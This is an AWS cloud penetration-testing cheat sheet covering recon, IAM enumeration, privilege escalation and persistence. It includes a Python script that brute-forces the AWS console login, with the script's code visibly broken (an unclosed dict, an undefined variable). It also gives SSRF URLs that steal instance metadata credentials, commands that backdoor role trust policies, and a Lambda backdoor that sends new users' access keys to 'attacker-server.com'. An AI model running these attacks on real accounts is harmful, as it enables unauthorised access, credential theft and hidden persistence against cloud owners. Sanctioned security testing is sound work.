## Recon / Discovery

### Basic recon
```
host -a client.com
```

```
nslookup x.x.x.x 
```

```
nmap -Pn -p- -sV -vv -A -sS client.com
```

### DNSRecon
- https://github.com/darkoperator/dnsrecon
- https://github.com/lanmaster53/recon-ng
- https://github.com/aboul3la/Sublist3r
- https://github.com/OJ/gobuster

### DNS brute force
- https://github.com/lutzenfried/subLocal

### Commonspeak2
Commonspeak2 leverages publicly available datasets from Google BigQuery to generate content discovery and subdomain wordlists.  

- https://github.com/assetnote/commonspeak2

### Assetnote (wordlists)
Assetnote is an External Attack Surface Management tool but provide some very great wordlists from their Github repository. Theses wordlists can be used for directory/file brute force as well as DNS enumeration through DNS brute force.  

- https://github.com/assetnote/wordlists

### AWS S3 and web app
Some applications may pull content directly from S3 buckets.  
--> Look to see where web resources are being loaded from (css, js, images, files...) to determin if S3 buckets are in use.  

- https://xxxxx.s3.amazonaws.com
- https://s3-[region].amazonaws.com/[OrgName]
- s3://

### Specific Google Dorks
##### Amazon WorkMail endpoint 
- inurl:/mail site:awsapps.com

##### Amazon Single Sign-On (SSO)
- site:awsapps.com inurl:start

##### API Gateway in AWS  
This could be :  
- HTTP API
- REST API
- WebSocket API
- REST API (private, only accessible within a VPC)

- site:.execute-api.us-east-1.amazonaws.com

--> Note that you will be able to change the AWS region to target different locations.
--> Requests could be passed to Lambda function for example, blind exploitation possible.
--> Verb tampering attack could be used on restricted API to attempt bypass authentication, in case for example only GET request require authentication but POST is allowed.  

**Accessing misconfigured private API**  
It is possible to access private API if misconfigured.  
1. Use attacker AWS account
2. Create a new EC2 instance within the same Region with default VPC
3. Right click on instance ID and *Connect*
- At this step you will not be able to reach the private API and will receive a *Could not resolve host* from curl.
4. In attacker account go to VPC
5. Create security groups (ALL TCP - Anywhere outbound/inbound)
6. Create a VPC endpoint with service *com.amazonaws.us-east-1.execute-api* on **ALL** availability zone and select the previously created security group.
7. Retry access to the API

--> In this case de API is private, so only accessible through AWS VPC network and specific region. But the **Resource Policy** of this API gateway *ALLOW* for *ANY PRINCIPAL* to *execute-api:Invoke* on any *Resource*.
```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "execute-api:Invoke",
            "Resource": "*"
        }
    ]
}
```

### MX Records
Point to where an organization email assets are hosted.
- Using recon-ng
- dig mx client.com

### Certificate Transparency
--> https://crt.sh/
--> https://censys.io/certificates
--> https://ui.ctsearch.entrust.com/ui/ctsearchui

### Cloud IP Ranges
Most cloud providers publish up to date lists of their IP address ranges. This tools identifies if an IP belongs to a provider's ranges by fetching and parsing the latest lists.  

https://github.com/nccgroup/cloud_ip_ranges

### Cloud Enumeration
Unauthenticated enumeration on the following services :
- Amazon Web Services : S3 Buckets
- Microsoft Azure : Storage Accounts
- Google Cloud Platform : GCP Buckets  

https://github.com/initstring/cloud_enum

### Cloud Brute
Find a company (target) infrastructure, files, and apps on the top cloud providers (Amazon, Google, Microsoft, DigitalOcean, Alibaba, Vultr, Linode).  

--> Use ipinfo.io API key  

https://github.com/0xsha/CloudBrute

### Git / Repo secret parsers
- gitleaks (https://github.com/zricethezav/gitleaks)  
- trufflehog (https://github.com/trufflesecurity/truffleHog)
- git-secrets (https://github.com/awslabs/git-secrets)
- shhgit (https://github.com/eth0izzle/shhgit)
- gitrob (https://github.com/michenriksen/gitrob)

### SharpCloud
SharpCloud is a simple C# utility for checking for the existence of credential files related to Amazon Web Services, Microsoft Azure, and Google Compute.  

##### Searches all user profiles for credentials related to Amazon Web Services.

```
SharpCloud.exe aws
```

- https://github.com/chrismaddalena/SharpCloud

### Identifying AWS Account ID
- https://www.zeuscloud.io/post/aws-account-id-an-attackers-perspective

- If you find an AWS Access Key ID, you can determine the associated Account ID using the sts:GetActionKeyInfo action.
- You can reverse engineer the AWS Account ID of a public S3 bucket.  
- You can find an Access Key ID in an S3 presigned URL even if the S3 bucket is not public. Then, you can use that access key to determine the Account ID.
- If you happen to breach an EC2 instance or access IAM user/role credentials, you can use the sts:GetCallerIdentity action to determine the Account ID.

### Unauthenticated enumeration (AWA Account ID, Users, Roles...)
- https://github.com/Frichetten/enumate_iam_using_bucket_policy.git
- https://github.com/righteousgambit/quiet-riot
```
pip install quiet-riot
quiet-riot --profile testAWS --threads 10 --wordlist wordlists/role_name.txt --scan 4.1
```

Using PACU Module - Enumerating role
```
Pacu (SessionName:AWS_Attacker) > run iam__enum_roles --role-name attackerrole --account-id VICTIMAWSACCOUNTID
```

- https://hackingthe.cloud/aws/enumeration/enum_iam_user_role/

### Enumerate IAM permissions
Found a set of AWS credentials and have no idea which permissions it might have?  
--> AccessKey/SecretKey needed (authentication require)  
https://github.com/andresriancho/enumerate-iam  
 
Sometimes it freezes after couple of API calls. Since AWS APIs are being updated continuously. Weâ€™ll need to manually synchronize APIs with this tool.  
```
git clone --depth 1 https://github.com/aws/aws-sdk-js.git
```

```
python generate_bruteforce_tests.py
```

### Enumerate IAM users
- https://rhinosecuritylabs.com/aws/aws-iam-user-enumeration/
Using the PACU module [iam__enum_users](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#iam__enum_users) an unauthenticated attacker can enumerate valid IAM users for a specific AWS Account ID. The only informations the attacker need is the AWS Account ID of the targeted organization.


### AWS Console Password spraying
- https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/
- https://github.com/WhiteOakSecurity/GoAWSConsoleSpray

```
./GoAWSConsoleSpray -a 537974518037 -u usernames -p passwords -v
```

### AWS Console Brute Force
Python code to brute force AWS Console login, if the user have MFA enable, it will return success and redirect to MFA page. (False positive)
```
#!/usr/bin/python3

import argparse
import requests
import time

headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',

parser = argparse.ArgumentParser()
parser.add_argument('--account-id','-id', required=True, default=False, metavar='account_id', type=str)
parser.add_argument('--username','-u', required=True, default=False, metavar='username', type=str)
parser.add_argument('--wordlist','-w', required=True, default=False, metavar='file_path', type=str)
args = parser.parse_args()

if __name__ == '__main__':
    data['account'] = args.account_id
    data['username'] = args.username
    passwords = open(args.wordlist).read().splitlines()
    for password in passwords:
        time.sleep(2)
        data['password'] = password
        print("--> Attempt with password : " + password)
        response = requests.post(
                'https://signin.aws.amazon.com/authenticate',

                verify=False
                )
        print(response.text)
        if '"result":"SUCCESS"' in response.text:
            print(response.text)
            print("="*20)
            print("Passwrod: ", password)
            break
```

### Resource policies
When we compromised some identify in an environment we should not only focused on identity policiies (such as user having list:bucket) but we should also focus on resource based policies which can have a pre-existing trust relationship. 

<img src="./../images/aws_resource_based_policies.png" width="700"/>

### Enumerate AWS role 
It is possible to enumerate AWS role from an AWS attacker account to other non related victim account (cross account role enumeration).

In order to proceed to enumeration, the following are required :
- Attacker AWS account with sufficient permission *iam:UpdateAssumeRolePolicy*
- Target AWS account ID
- Existing Role to be modify on attacker AWS account
```
aws iam update-assume-role-policy --role-name roleEnum --policy-document file://role_policy.json
```

### Retrieve Account ID from AWS Access Key

In order to proceed to enumeration, the following are required :
- Attacker AWS account  

```
aws sts get-access-key-info --access-key-id=AKIAXXXXXXXXXXX  
```

> {"Account": "8XXXXXXXXXX"}

### CloudFox

## Exploitation / Post Exploitation
Exploitation and post exploitation are really tight in Cloud environment.

#### Exploiting Github OIDC Integration
- https://dagrz.com/writing/aws-security/hacking-github-aws-oidc/

#### Web app SSRF : Accessing metadata
Extracting secrets using SSRF  
https://5x.xx.x.xx/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name  
--> Mitigation : Enable IMDSv2  
https://aws.amazon.com/fr/premiumsupport/knowledge-center/ssm-ec2-enforce-imdsv2/

#### Accessing IMDS for ECS
Containers running on ECS access their temporary tokens at the **169.254.170.2/v2/credentials/GUID** URL.  

--> The GUID is defined in the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variable.

#### ECS Task definitions
The ECS task definitions could contain some secrets.

1. --> Use PACU : module : *ecs__enum* --regions ca-central-1 (should be realized over potential regions where containers are located)  

--> This will return the following informations:
- Clusters
- Containers
- Services
- Amout of task definitions

2. Then use PACU : module : *ecs__enum_task_def* to grab the task defintions from previously saved *ecs__enum* module output.

#### Exploiting LAMBDA function
There is no metadata service at http://169.254.169.254 for Lambda functions. Lambda does it differently, it stores the credentials in **environment variables**.  

- /self/proc/environ
- /etc/environment
- Via command injection : 
```
printenv
```
	
--> Check for Lambda runtime API presence. (*AWS_LAMBDA_RUNTIME_API* )

If we can execute code on the server --> we can exfiltrate those credential.   

We would then have access to all the permissions associated with the role attached to the Lambda function.  

--> Some thing to keep in mind while pentesting Lambda functions (with read access).

- Check the tags associated with each function for sensitive information. This is highly unlikely, but not unheard of.

- Consider copying the whole function over to your own AWS account for testing, so that you don't need to make noise in the target environment.

- If you have CloudWatch logs access, review the execution logs for each Lambda function to see if anything sensitive was printed (stored in the **/aws/lambda/function name** log group).

- You can download a .zip file of the entire Lambda function from the AWS web
console by clicking on the **Actions** drop-down menu, clicking on **Export
function** , and choosing **Download deployment package** . Then, it is simple to port over to your own account.

- Try to formulate your payloads so that they do what you want without breaking
the execution of the function. A Lambda function execution that errors out might attract some unwanted attention!

- When writing your payloads, be wary of the timeout of the function. The default is for the function to timeout after three seconds, so you will need some quick, easy exfiltration in that case.  

#### ECS Container Images
It is also possible to steal secrets directly from ECS Container Images in case we previously obtain ECS access tokens via [SSRF for example](#Accessing-IMDS-for-ECS)

1. Authenticate to the container registry  
```
aws ecr get-login-password --region ca-central-1 --profile profile | docker login --username AWS --password-stdin 066XXXXX.dkr.ecr.ca-central-1.amazonaws.com/web-serevices
```

2. Pull the image  
```
docker pull 066XXXXX.dkr.ecr.ca-central-1.amazonaws.com/web-services
```

3. Inspect the image  
```
docker inspect 066XXXXX.dkr.ecr.ca-central-1.amazonaws.com/web-services
```
- Abusing Misconfigured ECR Resource Policies
https://hackingthe.cloud/aws/exploitation/Misconfigured_Resource-Based_Policies/misconfigured_ecr_resource_policy/

#### AWS Honey tokens

AWS honeytokens are strategically placed in various locations, such as a private Git repo, on the file system of a certain server, and other similar places. Their main purpose is to detect when an attacker has breached their environment. An attacker would likely use AWS keys that they find, but aws honeytokens have no permissions and immediately alert the account owner when they are used.

#### Exploiting public EBS volumes (same with EC2 AMI)
Elastic Block Store (Amazon EBS) has a "public" mode that makes your virtual hard disk available to anyone on the internet. (More precisely it is snapshot which can be made public)

01. Pick an exposed snapshot
02. Attach the volume to your EC2 instance
03. Search the disk for secrets

--> By searching exposed EBS volumes, an attacker can steal secrets from a server that isnâ€™t even exposed to the internet

#### Golden SAML Attack
https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps

Golden SAML introduces to a federation the advantages that golden ticket offers in a Kerberos environment â€“ from gaining any type of access to stealthily maintaining persistency.  

Hereâ€™s a list of the requirements for performing a golden SAML attack:

- Token-signing private key
- IdP public certificate
- IdP name
- Role name (role to assume)
- Domain\username
- Role session name in AWS
- Amazon account ID

**Usefull tools:**

#### Shadow Copy Attack
Shadow Copy attack targets domain controllers running in AWS.   

--> Any AWS user possessing the *EC2:CreateSnapshot* permission can steal the hashes of all domain users:  
1. Create a snapshot of the Domain Controller
2. Mount snapshot to an instance under control
3. Export NTDS.dit and SYSTEM registry hive file for use with Impacket's secretsdump

#### Aws escalate
It is possible to detect what users have access to what privilege escalation methods in an AWS environment. It can be run against any single user or every user in the account if the access keys being used have IAM read access.

#### Confused Deputy attack
**Deputy**: Programs which taks actions on the behalf of other programs or people

**Confused Deputy**: Profram which has permissions given to it for one purpose, applies those permissions for some other purpose, that is contrary to the original intent of the permission, and therefore allows something that it shouldn't.

Within AWS, each principal (user,service,group...) has some privileges set required to access AWS services or resources.   

Sometimes it is require to allow a principal to access an AWS resources using a different set of privileges. In order to authorize a principal A for example to assume the role of another principal B and act as this principal B, AWS allow principals to use *sts:AssumeRole* to acquire temporary credentials for a role.  

A role is only another type of principal owning some policies (ex: *AmazonS3ReadOnlyAccess*). The main goal of the role is to allow AWS resources (EC2 for example) to access AWS Services (S3 for example). But role can also be used to provide users other privileges using temporary credentials (AssumeRole).  

Role are identified by ARN (Amazon Resource Name) syntaxe :
- *arn:aws:iam:452653435123:role/FullAdminAccess*

--> Principals can assume role that are located in their AWS account or within another AWS account : **Cross-Account role assumption**. (*This is the basis for cross-account role enumeration technique*)

## Privilege Escalation
#### Random privesc tips
0. Launching Rhino Security Lab tool : **aws_escalate.py**  
	--> https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/aws_escalate.py

1. Using modules *iam__enum_permissions* then *iam__privesc_scan* within PACU framework

2. Creating a new user access key :
	- *iam:CreateAccessKey* permission required  
	
--> Allows the attacker to request a new accesskey, secretkey belonging to another user in AWS environment, including full admin user.

3. Creating new login profile :
	- *iam:CreateLoginProfile* permission required  

--> Allows the attacker to create a password for a privileged entity that only has API keys, but no password based login for AWS Console.

4. Updating an existing login profile : 
	- *iam:UpdateLoginProfile* permission required  

--> Allows the attacker to change the password belonging to a login profile and use the gained privileges

5. Attaching a managed policy to an entity : If any of the following permissions:
	- *iam:AttachUserPolicy*
	- *iam:AttachGroupPolicy*
	- *iam:AttachRolePolicy*  

--> The attacker will be able to attach a new managed policy, including the AdministratorAccess policy.

6. Creating or Updating an inline policy for an entity : If any of the following permissions :
	- *iam:PutUserPolicy*
	- *iam:PutGroupPolicy*
	- *iam:PutRolePolicy*  
	
--> Allows the attacker to update an existing inline policy for a user, group or role, to add any arbitrary permission

7. Creating a new inline policy : Easiest way to privesc
	- *iam:CreatePolicy* permission required  

--> The attacker will be able to add a stealthy admin policy with misleading name such as "ReadOnlyPolicy"

8. Adding a user to a group.
	- *iam:AddUserToGroup* permission required  

--> The attacker will be able to add him or another compromised account to an existing IAM group

9. Updating the **AssumeRolePolicy** : Every role has a policy that defines who can assume this role : The combination of the following permissions is require for a user :
	- *iam:UpdateAssumeRolePolicy*
	- *sts:AssumeRole* (sts = Security Token Service)  

--> The attacker will be able to change this policy and assume a more privileged role

10. Same as previous one with the following permission :
	- *iam:SetDefaultPolicyVersion* permission  

--> Attacker will be able to change the default version of the policy to another one, which might give more privileges

11. Passing a role to a new Lambda Function and invoking it : The combination of the following permissions :
	- *iam:PassRole*
	- *lambda:CreateFunction*
	- *lambda:InvokeFunction*  

--> The attacker will be able to pass an existing role to a new Lambda function. For example : iam:AttachUserPolicy permission.

12. Updating the code of an existing Lambda function : The following permission is required :
	- *lambda:UpdateFunctionCode*  

--> The attacker will be able to modify and upload the code in an existing Lambda function and access the privileges associated with the Lambda function.

13. Creation a new policy **version** : The following permission is required:
	- *iam:CreatePolicyVersion*  

--> The attacker will be able to create new version of an IAM policy that they have access to. It needs to be set as the default version to take effect. This does not require the *iam:SetDefaultPolicyVersion*

14. Creating an EC2 instance with an existing instance profile : the combination of the following permissions is required for a user :
	- *iam:PassRole*
	- *ec2:RunInstances*
	
--> The attacker will be able to create a new EC2 instance that they will have OS access to and pass an existing EC2 instance profile/service role to it.  
--> Access to instance using 2 ways:
	- create/import SSH key and associated it with the instance on creation
	- Supply a script in the EC2 User Data<br/>

**NOTE**: Indicator of compromise will be triggered when EC2 instance profile credentials are used outside of the specific instance, not a smart move to exfiltrate these credentials and run them locally, but rather access the AWS API from within that EC2 instance

15. Passing a role to a new Lambda function, then triggering it with DynamoDB : The combination of the following permissions is require :
	- *iam:PassRole*
	- *lambda:CreateFunction*
	- *lambda:CreateEventSourceMapping*  
	
--> Attacker will be able to pass an existing IAM role to a new Lamnbda function that includes code to import the relevant AWS library to their programing language of choice. They then would need to either create a DynamoDB table or use an existing one, to create an event source mapping for the Lambda function pointing to that DynamoDB table. Then they would need to either put an item into the table or wait for another method to do so that the Lambda function will be invoked.



16. Passing a role to a Glue Development Endpoint : The combination of the following permissions is require :
	- *iam:PassRole*
	- *glue:CreateDevEndpoint*  
	
--> The attacker will be able to create a new AWS Glue development endpoint and pass an existing service role to it. They attacker would be able to SSH into the instance and use the AWS CLI to have access of the permissions the role has access to.

**NOTE**: It would be preferable for attacker to directoy use the AWS API from the new instance instead of extracting the credentials from the Glue Instance (GuardDuty will probably trigger some detection, as in method 14)

17. Updating an existing Glue Development Endpoint : The following permission is required : 
	- *glue:UpdateDevEndpoint*  

--> Attacker wil be able to update the associated SSH public key of an existing Glue Development endpoint.

18. Passing a role to CloudFormation : Combination of the following permissions is require :
	- *iam:PassRole*
	- *cloudformation:CreateStack*  
	
--> Attacker will be able to escalate privileges by creating a CloudFormation template that will perform actions and create resources using the permissions of the role that was passed when creating the CloudFormation stack.

19. Passing a role to Data Pipeline : Combination of the following permissions is require : 
	- *iam:PassRole*
	- *datapipeline:CreatePipeline*
	- *datapipeline:PutPipelineDefinition*  

--> The attacker would be able to create a pipeline, update the pipeline and run arbitrary AWS CLI command using the permission of the Role that was passed in.


#### AWS Services Data harvesting (post-exploitation)
S3
+ Save the content of a bucket, i.e. the objects.
	- *s3_list_bucket_contents* module : WeirdAAL (List content)
	- *s3 download file* module : WeirdALL (Download specific file)
	- *s3__download_bucket* module : PACU

SQS
+ Save the content of a queue, i.e. the messages.
	- *sqs.py* module : Froud
	--> Scans the given SQS queue, saving the results locally or uploading them publicly to an S3 bucket.
	
DynamoDB
+ Scan and retrieve all items from the table, save the results locally.
	- *dynamodb.py* module : Froud
	- *cloudwatch__download_logs* module : PACU

CloudWatch
+ Scan for all log groups and log streams, save the events from the streams locally.
	- *cloudwatch.py* module : Froud

## Persistences

#### Simple Email Service (SES)

--> Assume we compromised an account with full access on SES. 
- Phishing on allowed sending domains
- Modifying SES email template, adding malicious URL

#### Random backdoors/persistences techniques

1. Backdoor rules to an EC2 security group : **PACU** : *ec2__backdoor_ec2_sec_groups* module  
	--> Attacker attaches nw inbound rules to a security group to allow access to the EC2 instance.
	
2. Adding new user access key or password : **Multiples techniques** 
```
aws iam list-access-keys --user-name Sarah --profile Test
aws iam create-access-key --user-name Sarah --profile Test
```

OR
```
run iam__backdoor_users_keys (PACU)
run iam__backdoor_users_passwords(PACU)
```

3. Altering user data script : **PACU** : *ec2__startup_shell_script* module

4. Creating copies of deleted users : **AwsPwn** : *rabbit_lambda* module  
	--> In case the user accessed or created by the attacker is discovered
and deleted, it is automatically re-generated through Lambda function.

5. Adding access key to each newly created user : **AwsPwn** : *backdoor_created_users_lambda* module  
	--> Lambda function which responds to "CreateUser" events and sends fershly generated access key and secret key

6. Adding backdoor rules to newly created EC2 security groups : **AwsPwn** : *backdoor_created_security_groups_lambda* module  
	--> Add an arbitrary inbound access rule to new security groups, in response to each "CreateSecurityGroup" event.
	
7. Resource injection in CloudFormation templates.  
- https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/

8. VPC traffic mirroring within AWS.  
- https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws/

9. Add new Inline Policy to a user, group or role
- Adding Inline Policy to a specific user, group or role could be stealthier than creating a role, adding customer managed policies as the Inline Policy is only link to a specific AWS principal so less visible.

10. Backdooring role trust relationship
- Usefull as we can realize cross-account trust relationship and give permission directly to our own attacker account.
- The most important is to find a suitable target role
```
aws iam update-assume-role-policy --role-name Admin --policy-documentfile://trust-policy.json --profile Test
```
	
--> Confirming access:
```
aws sts assume-role --role-arn arn:aws:iam::111111111111:role/Admin --role-session-name PersistenceTest --profile attackerProfileAccount
```

OR
```
iam__backdoor_assume_role (PACU)
```

11. Using Lambda
Using lambda we can exfiltrate credentials
--> Lambda function will be trigger on every new user creation to add a new set of access keys to that user, then exfiltrates thosecredentials to a server we specified  
- The attacker creates a malicious Lambda function in a target account1.
- The attacker creates a trigger to run the Lambda function every time a new IAM user is created
- The attacker sets up a listener on a server that they control, which will wait for credentials
- New user is created within the environment
- The attacker's Lambda function is triggered
- The function adds a set of access keys to the newly created user
- The function makes an HTTP request to the attacker's server with the access key just created

--> Lambda adds to the equation is the ability to do persistent in continuously manner.
--> For a function to trigger an event 
	- CloudWatch event rule must be created
	- Also need cloudtrail to be enabled in **us-east-1** region
		--> Because function is triggered by an IAM event (*iam:CreateUser*), and IAM events are only delivered to **us-east-1** CloudWatch Events.

--> **OR** use PACU module : *lambda__backdoor_new_users*
```
run lambda__backdoor_new_users --exfil-urlhttp://attacker-server.com/
run lambda__backdoor_new_users --cleanup
```
